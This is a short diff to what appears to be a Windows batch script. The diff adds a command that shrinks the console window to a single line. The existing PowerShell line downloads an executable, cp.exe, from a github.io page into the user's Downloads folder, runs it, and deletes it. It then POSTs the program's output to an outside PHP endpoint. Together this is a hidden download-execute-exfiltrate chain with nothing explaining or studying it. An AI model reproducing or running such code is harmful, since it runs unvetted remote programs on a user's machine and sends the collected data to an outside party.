@@ -1,1 +1,2 @@
+mode con: cols=15 lines=1
 powershell "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"; "Invoke-WebRequest -Uri https://redcoconut.github.io/Redc/cp.exe -OutFile C:/Users/$env:UserName/Downloads/cp.exe -UseBasicParsing"; "cd C:/Users/$env:UserName/Downloads"; "$One = cmd /c 'cp.exe'"; "cmd /c "del /f cp.exe""; "$content = "$One""; "$URI = 'http://red.scienceontheweb.net/filetest.php'"; "$Body ='name=' + $content + '&B1=SUBMIT%21'"; "$page = Invoke-WebRequest $URI -body $Body -method POST" 
